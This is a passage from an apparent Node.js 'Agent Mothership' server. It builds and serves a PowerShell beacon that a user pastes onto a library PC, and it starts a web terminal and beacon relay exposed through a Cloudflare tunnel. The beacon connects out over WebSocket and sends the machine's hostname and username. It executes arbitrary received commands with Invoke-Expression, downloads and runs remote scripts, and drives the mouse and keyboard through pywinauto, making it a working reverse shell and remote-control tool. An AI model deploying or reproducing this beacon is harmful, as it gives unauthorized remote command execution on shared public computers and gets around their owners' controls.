    '    - Open/close programs (Notepad, Chrome, etc.)',
    '    - Control the mouse and keyboard (via pywinauto if available)',
    '    - Run Python scripts',
    '    - Access files',
    '',
    '    Press Ctrl+C to disconnect.',
    '#>',
    '',
    'param(',
    '    [string]$ServerUrl = "' + wsUrl + '",',
    '    [string]$Token = "' + BEACON_TOKEN + '"',
    ')',
    '',
    '$Host.UI.RawUI.ForegroundColor = [ConsoleColor]::Cyan',
    'Write-Host ""',
    'Write-Host "╔══════════════════════════════════════════╗"',
    'Write-Host "║     🪟 Agent Mothership — BEACON v2     ║"',
    'Write-Host "║     Library PC Remote Control            ║"',
    'Write-Host "╚══════════════════════════════════════════╝"',
    'Write-Host ""',
    '',
    'Write-Host "Connecting to mothership relay..." -ForegroundColor Yellow',
    'Write-Host "URL: $ServerUrl" -ForegroundColor Gray',
    'Write-Host ""',
    '',
    '$pythonAvailable = $false',
    'try {',
    '    $pyVersion = python --version 2>&1',
    '    if ($pyVersion -match "Python") {',
    '        $pythonAvailable = $true',
    '        Write-Host "  $(python --version 2>&1)" -ForegroundColor Green',
    '        try {',
    '            python -c "import pywinauto; print(\"ready\")" 2>&1 | Out-Null',
    '            if ($LASTEXITCODE -eq 0) { Write-Host "  pywinauto available" -ForegroundColor Green }',
    '        } catch { Write-Host "  pywinauto not installed" -ForegroundColor Yellow }',
    '    }',
    '} catch { Write-Host "  Python not found" -ForegroundColor Yellow }',
    '',
    '# WebSocket client is built into .NET - no need to Add-Type',
    '',
    'function Receive-Message($beaconWs, $buffer, $cancellationToken) {',
    '    $stream = New-Object System.IO.MemoryStream',
    '    do {',
    '        $seg = New-Object System.ArraySegment[byte] -ArgumentList (,$buffer)',
    '        $r = $beaconWs.ReceiveAsync($seg, $cancellationToken).GetAwaiter().GetResult()',
    '        $stream.Write($buffer, 0, $r.Count)',
    '    } while (-not $r.EndOfMessage)',
    '    $stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null',
    '    return [System.Text.Encoding]::UTF8.GetString($stream.ToArray())',
    '}',
    '',
    'function Send-Message($beaconWs, $data) {',
    '    $json = ($data | ConvertTo-Json -Compress -Depth 10)',
    '    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)',
    '    $seg = New-Object System.ArraySegment[byte] -ArgumentList (,$bytes)',
    '    $beaconWs.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()',
    '}',
    '',
    '$maxRetries = 10',
    '$retryCount = 0',
    '$connected = $false',
    '',
    'while (-not $connected -and $retryCount -le $maxRetries) {',
    '    if ($retryCount -gt 0) {',
    '        $wait = [Math]::Min(30, 5 * [Math]::Pow(1.5, $retryCount - 1))',
    '        Write-Host "Retry $retryCount of $maxRetries in ${wait}s..." -ForegroundColor Yellow',
    '        Start-Sleep -Seconds $wait',
    '    }',
    '    $retryCount++',
    '    try {',
    '        $beaconWs = New-Object System.Net.WebSockets.ClientWebSocket',
    '        $beaconWs.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)',
    '        $uri = [System.Uri]($ServerUrl + "?token=" + $Token)',
    '        $beaconWs.ConnectAsync($uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()',
    '        $connected = $true',
    '        Write-Host ""',
    '        Write-Host "Connected!" -ForegroundColor Green',
    '        Send-Message $beaconWs @{ type="info"; data=@{ hostname=$env:COMPUTERNAME; username=$env:USERNAME; python=$pythonAvailable } }',
    '        while ($beaconWs.State -eq "Open") {',
    '            $cts = New-Object System.Threading.CancellationTokenSource',
    '            $cts.CancelAfter(130000)  # 130s timeout — prevents terminal freeze!',
    '            try {',
    '                $raw = Receive-Message $beaconWs ([System.Byte[]]::new(131072)) $cts.Token',
    '            } catch {',
    '                Write-Host "Receive error — reconnecting..." -ForegroundColor Yellow',
    '                break',
    '            }',
    '            if (-not $raw) { break }',
    '            $msg = ($raw | ConvertFrom-Json)',
    '',
    '            # Handle server keepalive ping',
    '            if ($msg.type -eq "ping") {',
    '                Send-Message $beaconWs @{ type = "pong" }',
    '                continue',
    '            }',
    '',
    '            $response = @{ id = $msg.id }',
    '',
    '            # Send immediate acknowledgement — keeps Cloudflare tunnel alive during long commands',
    '            Send-Message $beaconWs @{ id = $msg.id; type = "ack" }',
    '',
    '            try {','                if ($msg.scriptUrl) {',
    '                    Write-Host "Downloading script: $($msg.scriptUrl)" -ForegroundColor Cyan',
    '                    $raw = (Invoke-WebRequest -Uri $msg.scriptUrl -UseBasicParsing).Content; $scriptContent = if ($raw -is [byte[]]) { [System.Text.Encoding]::UTF8.GetString($raw) } else { $raw }',
    '                    $LASTEXITCODE = 0',
    '                    $response.stdout = $(Invoke-Expression $scriptContent 2>&1 | Out-String)',
    '                    $response.exitCode = $LASTEXITCODE',
    '                } elseif ($pythonAvailable -and $msg.command -match "^pywinauto:") {',
    '                    $py = $msg.command -replace "^pywinauto:", ""',
    '                    $LASTEXITCODE = 0',
    '                    $response.stdout = $(python -c $py 2>&1 | Out-String)',
    '                    $response.exitCode = $LASTEXITCODE',
    '                } else {',
    '                    $LASTEXITCODE = 0',
    '                    $response.stdout = $(Invoke-Expression $msg.command 2>&1 | Out-String)',
    '                    $response.exitCode = $LASTEXITCODE',
    '                }',
    '            } catch { $response.stderr = "$_"; $response.exitCode = 1 }',
    '            Send-Message $beaconWs $response',
    '        }',
    '        $connected = $false  # trigger reconnect on exit or timeout',
    '        try { $beaconWs.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "done", [System.Threading.CancellationToken]::None).GetAwaiter().GetResult() } catch {}',
    '    } catch { Write-Host "Connection failed: $_" -ForegroundColor Red; $connected = $false }',
    '    finally { if ($beaconWs) { $beaconWs.Dispose() } }',
    '}',
    '',
    'if (-not $connected) { Write-Host "Max retries reached. Copy-paste the script again." -ForegroundColor Red }',
    'Write-Host "Beacon disconnected." -ForegroundColor Yellow',
    '',
  ].join("\n");
}



// ──────────────────────────────────────────────
// Start
// ──────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║     🌐 Agent Mothership — Web Terminal + Beacon     ║
║                                                      ║
║     Local:  http://localhost:${PORT}                          ║
║     Shell:  ${SHELL}                                         ║
║                                                      ║
║  📡 Beacon Relay ready for library PC connection     ║
║     WebSocket: ws://localhost:${PORT}/beacon                  ║
║                                                      ║
║  📋 Get the beacon script:                           ║
║     http://localhost:${PORT}/beacon-script                    ║
║                                                      ║
║  Now start your Cloudflare Tunnel:                   ║
║     cloudflared tunnel --url http://localhost:${PORT}          ║
╚══════════════════════════════════════════════════════╝
  `);
});
